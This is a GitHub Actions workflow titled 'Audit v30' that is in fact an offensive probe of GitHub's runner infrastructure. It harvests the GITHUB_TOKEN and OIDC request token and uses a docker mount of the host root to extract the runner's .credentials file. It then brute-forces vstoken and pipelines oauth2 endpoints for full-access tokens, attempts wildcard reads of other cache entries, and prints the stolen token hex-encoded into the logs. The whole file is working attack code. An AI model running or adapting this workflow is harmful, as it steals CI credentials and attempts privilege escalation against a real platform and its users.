name: Audit v30
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v30:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V30 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "IDTOK_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
            echo "RUN_URL=$RUN_URL"; echo "$RUN_URL" > /tmp/run_url.txt
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: vstoken oauth2 — THE EXPLOIT
      # v29: OIDC + client_credentials = "hostId must be provided"
      # OIDC IS ACCEPTED! Just need hostId parameter.
      # Try every possible hostId candidate.
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - vstoken hostId
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== VSTOKEN HOSTID ==="
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          IDTOK=$(cat /tmp/idtok.txt)
          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
          JOB=$(cat /tmp/job.txt 2>/dev/null)
          VSBASE="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"

          # Get multiple OIDC tokens with different audiences
          echo "--- OIDC tokens ---"
          OIDC_VS=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://vstoken.actions.githubusercontent.com" | jq -r '.value // empty')
          OIDC_PIPE=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://pipelines.actions.githubusercontent.com" | jq -r '.value // empty')
          OIDC_GH=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api.github.com" | jq -r '.value // empty')
          echo "OIDC_VS=${#OIDC_VS} OIDC_PIPE=${#OIDC_PIPE} OIDC_GH=${#OIDC_GH}"

          # Decode OIDC to see its sub claim (which IS available in OIDC)
          python3 << 'PYEOF'
          import json, base64, os
          for name, envkey in [("VS", "OIDC_VS"), ("PIPE", "OIDC_PIPE")]:
            tok = os.environ.get(envkey, "")
            if not tok: continue
            parts = tok.split(".")
            if len(parts) >= 2:
              padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
              claims = json.loads(base64.urlsafe_b64decode(padded))
              print(f"OIDC_{name} claims: sub={claims.get('sub','')}")
              print(f"  aud={claims.get('aud','')}")
              print(f"  iss={claims.get('iss','')}")
              print(f"  repository={claims.get('repository','')}")
              print(f"  repository_owner={claims.get('repository_owner','')}")
              print(f"  repository_id={claims.get('repository_id','')}")
              print(f"  repository_owner_id={claims.get('repository_owner_id','')}")
              print(f"  run_id={claims.get('run_id','')}")
              print(f"  runner_environment={claims.get('runner_environment','')}")
          PYEOF

          OIDC_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$OIDC_VS" 2>/dev/null)

          # A: Try every possible hostId value
          echo "--- A: hostId candidates ---"
          for HID in \
            "$PLAN" \
            "$JOB" \
            "$(python3 -c "import json,base64;t=open('/tmp/cred_token.txt').read().strip().split('.')[1];t+='='*(4-len(t)%4);c=json.loads(base64.urlsafe_b64decode(t));print(c.get('runner_id',''))" 2>/dev/null)" \
            "$(python3 -c "import json,base64;t=open('/tmp/cred_token.txt').read().strip().split('.')[1];t+='='*(4-len(t)%4);c=json.loads(base64.urlsafe_b64decode(t));print(c.get('owner_id',''))" 2>/dev/null)" \
            "$(python3 -c "import json,base64;t=open('/tmp/cred_token.txt').read().strip().split('.')[1];t+='='*(4-len(t)%4);c=json.loads(base64.urlsafe_b64decode(t));print(c.get('orch_id',''))" 2>/dev/null)" \
            "$(python3 -c "import json,base64;t=open('/tmp/cred_token.txt').read().strip().split('.')[1];t+='='*(4-len(t)%4);c=json.loads(base64.urlsafe_b64decode(t));print(c.get('billing_owner_id',''))" 2>/dev/null)" \
            "8f795dfa-02d7-4018-af3a-c98d25c03f68" \
            "16cc8db7-5a82-87e5-749a-0b8db53d45e7" \
            "84ff2294-8721-ab49-db5a-db17b0f6c2de" \
            "1000000093" \
            "${{ github.repository_id }}" \
            "${{ github.repository_owner_id }}" \
            "${{ github.run_id }}" \
            "${{ github.actor_id }}" \
            "twrps" \
            "lacaag" \
            "twrps/PoC-RACE2" \
            "lacaag/PoC-RACE2" \
            "0" \
            "1" \
            "hosted" \
            "github-hosted" \
            "actions" \
            "github.com"; do
            [ -z "$HID" ] && continue
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "$VSBASE/_apis/oauth2/token" \
              -d "grant_type=client_credentials&client_assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access&hostId=$HID")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A hid='$HID' = $CODE | $(echo "$BODY" | head -c 300)"
          done
          echo ""

          # B: Try with client_id set to OIDC sub claim
          echo "--- B: OIDC sub as clientId ---"
          OIDC_SUB=$(python3 -c "
          import json,base64,os
          t=os.environ.get('OIDC_VS','').split('.')
          if len(t)>=2:
            p=t[1]+'='*(4-len(t[1])%4)
            print(json.loads(base64.urlsafe_b64decode(p)).get('sub',''))
          " 2>/dev/null)
          echo "OIDC_SUB=$OIDC_SUB"
          if [ -n "$OIDC_SUB" ]; then
            for HID in "$PLAN" "84ff2294-8721-ab49-db5a-db17b0f6c2de" "${{ github.repository_id }}" "1"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Content-Type: application/x-www-form-urlencoded" \
                "$VSBASE/_apis/oauth2/token" \
                -d "grant_type=client_credentials&client_assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$OIDC_SUB'))" 2>/dev/null)&scope=vso.full_access&hostId=$HID")
              CODE=$(echo "$R" | tail -1)
              echo "B sub+hid='$HID' = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
            done
          fi
          echo ""

          # C: Additional parameters that might be needed
          echo "--- C: Extra params ---"
          for EXTRA in \
            "resource=https://pipelines.actions.githubusercontent.com" \
            "resource=https://vstoken.actions.githubusercontent.com" \
            "resource=https://api.github.com" \
            "redirect_uri=https://github.com" \
            "tenant_id=${{ github.repository_owner_id }}"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "$VSBASE/_apis/oauth2/token" \
              -d "grant_type=client_credentials&client_assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access&hostId=$PLAN&$EXTRA")
            CODE=$(echo "$R" | tail -1)
            echo "C $EXTRA = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          done

        env:
          OIDC_VS: ${{ env.OIDC_VS }}
          OIDC_PIPE: ${{ env.OIDC_PIPE }}

      # ══════════════════════════════════════════════════════════════
      # STEP 3: OIDC token with different audiences as assertion
      # Also try on pipelines oauth2 with hostId 
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Pipelines oauth2 with hostId
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== PIPELINES OAUTH2 WITH HOSTID ==="
          RT=$(cat /tmp/rt.txt)
          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)

          # Get OIDC for pipeline audience
          OIDC=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://pipelines.actions.githubusercontent.com" | jq -r '.value // empty')
          OIDC_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$OIDC" 2>/dev/null)

          # A: Pipeline oauth2 with hostId (new parameter from vstoken discovery)
          echo "--- A: Pipeline + hostId ---"
          for HID in "$PLAN" "8f795dfa-02d7-4018-af3a-c98d25c03f68" "${{ github.repository_id }}" "1"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "${PURL}_apis/oauth2/token" \
              -d "grant_type=client_credentials&client_assertion=$OIDC_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=vso.full_access&hostId=$HID")
            CODE=$(echo "$R" | tail -1)
            echo "A hid='$HID' = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          done
          echo ""

          # B: Try different scopes on vstoken
          echo "--- B: Different scopes ---"
          VSBASE="https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21"
          OIDC_VS=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://vstoken.actions.githubusercontent.com" | jq -r '.value // empty')
          OIDC_VS_ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$OIDC_VS" 2>/dev/null)
          for SCOPE in \
            "vso.full_access" \
            "vso.build_execute" \
            "vso.code_write" \
            "vso.code_full" \
            "vso.packaging_write" \
            "app_token" \
            "session_token" \
            "Actions.GenericRead" \
            "Actions.GenericWrite" \
            "Actions.Results:server" \
            "openid" \
            "read write"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Content-Type: application/x-www-form-urlencoded" \
              "$VSBASE/_apis/oauth2/token" \
              -d "grant_type=client_credentials&client_assertion=$OIDC_VS_ENC&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=&scope=$SCOPE&hostId=$PLAN")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            # Only show if different from "hostId" error
            echo "B scope='$SCOPE' = $CODE | $(echo "$BODY" | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: Additional edge cases and SSRF
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Edge cases
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== EDGE CASES ==="
          RT=$(cat /tmp/rt.txt)
          IDTOK=$(cat /tmp/idtok.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)

          # A: Use GetCacheEntryDownloadURL to read ALL cache keys via pattern
          echo "--- A: Cache wildcard reads ---"
          RESULTS="https://results-receiver.actions.githubusercontent.com"
          for KEY in \
            "*" \
            "%" \
            "setup-*" \
            "npm-*" \
            "v27*" \
            "v28*" \
            "v29*" \
            "v30*"; do
            VER=$(echo -n "$KEY" | sha256sum | cut -d' ' -f1)
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              "$RESULTS/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" \
              -d "{\"key\":\"$KEY\",\"version\":\"$VER\",\"restore_keys\":[\"$KEY\"]}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            MATCHED=$(echo "$BODY" | jq -r '.matched_key // empty' 2>/dev/null)
            OK=$(echo "$BODY" | jq -r '.ok // empty' 2>/dev/null)
            [ "$OK" = "true" ] && echo "A key=$KEY = MATCH! matched=$MATCHED"
            [ "$OK" != "true" ] && echo "A key=$KEY = $CODE ok=$OK matched=$MATCHED"
          done
          echo ""

          # B: Cache with restore_keys to find entries with prefix matching
          echo "--- B: restore_keys prefix ---"
          VER=$(echo -n "any" | sha256sum | cut -d' ' -f1)
          for PREFIX in "v27-" "v28-" "v29-" "setup-node" "npm-cache" "pip" "go-build"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
              "$RESULTS/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" \
              -d "{\"key\":\"${PREFIX}exact-no-match\",\"version\":\"$VER\",\"restore_keys\":[\"$PREFIX\"]}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            OK=$(echo "$BODY" | jq -r '.ok // empty' 2>/dev/null)
            MATCHED=$(echo "$BODY" | jq -r '.matched_key // empty' 2>/dev/null)
            DL=$(echo "$BODY" | jq -r '.signed_download_url // empty' 2>/dev/null)
            echo "B prefix=$PREFIX ok=$OK matched=$MATCHED dl_len=${#DL}"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V30 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V30 COMPLETE ==="
